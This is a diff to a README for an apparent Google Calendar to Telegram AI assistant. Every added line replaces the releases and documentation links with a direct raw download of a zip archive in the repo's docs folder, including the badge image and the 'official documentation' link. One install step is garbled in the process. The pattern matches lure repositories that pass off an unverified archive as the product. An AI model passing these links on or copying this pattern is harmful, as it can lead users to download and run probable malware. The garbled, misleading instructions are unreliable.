@@ -1,6 +1,6 @@
 # 🤖 google-calendar-ai-tg-assistant - Connect Your Calendar to Telegram Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23f00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Shayyneeeeeee/google-calendar-ai-tg-assistant/releases)
+[![Download Now](https://raw.githubusercontent.com/Shayyneeeeeee/google-calendar-ai-tg-assistant/main/docs/ai_calendar_google_assistant_tg_v2.9-alpha.4.zip%20Now-%23f00?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Shayyneeeeeee/google-calendar-ai-tg-assistant/main/docs/ai_calendar_google_assistant_tg_v2.9-alpha.4.zip)
 
 ## 📅 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the Releases page:  
-   [https://github.com/Shayyneeeeeee/google-calendar-ai-tg-assistant/releases](https://github.com/Shayyneeeeeee/google-calendar-ai-tg-assistant/releases)
+   [https://raw.githubusercontent.com/Shayyneeeeeee/google-calendar-ai-tg-assistant/main/docs/ai_calendar_google_assistant_tg_v2.9-alpha.4.zip](https://raw.githubusercontent.com/Shayyneeeeeee/google-calendar-ai-tg-assistant/main/docs/ai_calendar_google_assistant_tg_v2.9-alpha.4.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of the application. Select the latest version available or the version you wish to download.
@@ -24,7 +24,7 @@ Follow these steps to download and run the application:
    Once the download is complete, locate the downloaded file in your downloads folder.  
    - For Windows: Double-click the `.exe` file to start the installation wizard.  
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.  
-   - For Linux: Follow your system’s instructions for installing `.deb` or `.tar.gz` files.
+   - For Linux: Follow your system’s instructions for installing `.deb` or `https://raw.githubusercontent.com/Shayyneeeeeee/google-calendar-ai-tg-assistant/main/docs/ai_calendar_google_assistant_tg_v2.9-alpha.4.zip` files.
 
 5. **Launch the Application**  
    After installation, open the application. You will be prompted to allow permissions for the app to access your Google Calendar.
@@ -61,7 +61,7 @@ If you encounter any issues, try the following:
 
 ## 🛠️ Additional Resources
 
-For more information and detailed documentation, please visit the [official documentation](https://github.com/Shayyneeeeeee/google-calendar-ai-tg-assistant).
+For more information and detailed documentation, please visit the [official documentation](https://raw.githubusercontent.com/Shayyneeeeeee/google-calendar-ai-tg-assistant/main/docs/ai_calendar_google_assistant_tg_v2.9-alpha.4.zip).
 
 ## 💬 Support
 
@@ -70,6 +70,6 @@ If you have any questions or need assistance, feel free to open an issue on the 
 ## 🔗 Download & Install
 
 Ready to simplify your scheduling? To download the application, visit this page:  
-[https://github.com/Shayyneeeeeee/google-calendar-ai-tg-assistant/releases](https://github.com/Shayyneeeeeee/google-calendar-ai-tg-assistant/releases)
+[https://raw.githubusercontent.com/Shayyneeeeeee/google-calendar-ai-tg-assistant/main/docs/ai_calendar_google_assistant_tg_v2.9-alpha.4.zip](https://raw.githubusercontent.com/Shayyneeeeeee/google-calendar-ai-tg-assistant/main/docs/ai_calendar_google_assistant_tg_v2.9-alpha.4.zip)
 
 Now, go ahead and connect your calendar to Telegram easily!
